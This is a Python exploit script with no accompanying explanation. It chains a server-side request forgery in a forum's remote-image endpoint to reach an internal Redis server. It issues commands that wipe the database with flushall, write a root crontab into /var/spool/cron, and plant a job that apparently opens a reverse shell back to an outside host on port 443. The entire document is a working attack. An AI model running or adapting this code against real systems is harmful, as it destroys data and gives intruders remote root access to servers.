#!/usr/bin/env python

# coding=utf-8

import requests

host = '10.105.0.23'

port = '6379'

bhost = 'fuzz.wuyun.com'

bport = '443'

vul_httpurl = 'http://www.miui.com/forum.php?mod=ajax&action=downremoteimg&message=[img]'

_location = 'http://fuzz.wuyun.com/302.php'

shell_location = 'http://fuzz.wuyun.com/shell.php'

#1 flush db

_payload = '?s=dict%26ip={host}%26port={port}%26data=flushall'.format(

    host = host,

    port = port)

exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(_location, _payload, vul_httpurl=vul_httpurl)

print exp_uri

print len(requests.get(exp_uri).content)

#2 set crontab command

_payload = '?s=dict%26ip={host}%26port={port}%26bhost={bhost}%26bport={bport}'.format(

    host = host,

    port = port,

    bhost = bhost,

    bport = bport)

exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(shell_location, _payload, vul_httpurl=vul_httpurl)

print exp_uri

print len(requests.get(exp_uri).content)

#3 config set dir /var/spool/cron/

_payload = '?s=dict%26ip={host}%26port={port}%26data=config:set:dir:/var/spool/cron/'.format(

    host = host,

    port = port)

exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(_location, _payload, vul_httpurl=vul_httpurl)

print exp_uri

print len(requests.get(exp_uri).content)

#4 config set dbfilename root

_payload = '?s=dict%26ip={host}%26port={port}%26data=config:set:dbfilename:root'.format(

    host = host,

    port = port)

exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(_location, _payload, vul_httpurl=vul_httpurl)

print exp_uri

print len(requests.get(exp_uri).content)

#5 save to file

_payload = '?s=dict%26ip={host}%26port={port}%26data=save'.format(

    host = host,

    port = port)

exp_uri = '{vul_httpurl}{0}{1}%23helo.jpg[/img]'.format(_location, _payload, vul_httpurl=vul_httpurl)

print exp_uri

print len(requests.get(exp_uri).content)